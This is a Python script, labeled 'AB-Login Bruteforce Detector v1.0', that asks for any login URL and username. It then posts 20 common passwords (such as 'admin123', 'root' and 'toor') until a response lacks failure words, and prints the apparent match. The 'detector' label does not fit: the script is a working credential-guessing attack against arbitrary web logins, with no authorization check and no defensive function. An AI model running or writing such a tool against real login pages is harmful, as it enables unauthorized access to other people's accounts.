import requests
import pyfiglet
from colorama import Fore, Style, init

init()

# BANNER
banner = pyfiglet.figlet_format("AB-LOGIN", font="slant")
print(Fore.RED + banner)
print(Fore.YELLOW + "=" * 60)
print(Fore.CYAN + "   AB-Login Bruteforce Detector v1.0")
print(Fore.CYAN + "   By: Abdullah Balouch | Pakistan 🇵🇰")
print(Fore.YELLOW + "=" * 60 + Style.RESET_ALL)

# TARGET
url = input(Fore.GREEN + "\n[*] Target Login URL: " + Style.RESET_ALL)
username = input(Fore.GREEN + "[*] Username to test: " + Style.RESET_ALL)

# PASSWORD LIST
passwords = [
    "123456", "password", "admin", "admin123",
    "12345678", "qwerty", "abc123", "111111",
    "123123", "welcome", "monkey", "dragon",
    "master", "letmein", "login", "pass123",
    "test123", "root", "toor", "pakistan"
]

print(Fore.YELLOW + f"\n[*] Testing {len(passwords)} passwords...\n")

found = False
for password in passwords:
    data = {"username": username, "password": password}
    try:
        response = requests.post(url, data=data, timeout=5)
        if "incorrect" not in response.text.lower() and \
           "invalid" not in response.text.lower() and \
           "wrong" not in response.text.lower() and \
           response.status_code == 200:
            print(Fore.GREEN + f"[✓] FOUND! Password: {password}")
            found = True
            break
        else:
            print(Fore.RED + f"[-] Failed: {password}")
    except:
        print(Fore.RED + f"[!] Error connecting")
        break

if not found:
    print(Fore.YELLOW + "\n[!] No password found in list!")

print(Fore.CYAN + "\n[*] Scan complete! - AB Shadow Intel 🇵🇰")
